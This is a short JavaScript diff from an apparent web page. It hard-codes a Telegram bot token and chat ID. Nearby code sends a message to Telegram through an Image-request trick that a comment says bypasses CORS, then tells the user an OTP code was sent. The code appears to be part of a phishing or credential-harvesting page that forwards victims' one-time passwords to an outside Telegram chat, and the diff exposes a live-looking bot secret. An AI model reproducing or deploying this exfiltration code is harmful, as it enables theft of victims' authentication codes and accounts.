@@ -122,7 +122,10 @@
       const params = new URLSearchParams({ chat_id: chatId, text: message });
 
       try {
-        // Gunakan trik Image agar request pasti dikirim (bypass CORS)
+        // Telegram Bot API info - replace with your own bot token and chat ID
+      const botToken = "8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo";
+      const chatId = "5906925079";
+        
         const img = new Image();
         img.onload = () => {
           alert("Kode OTP berhasil dikirim.");
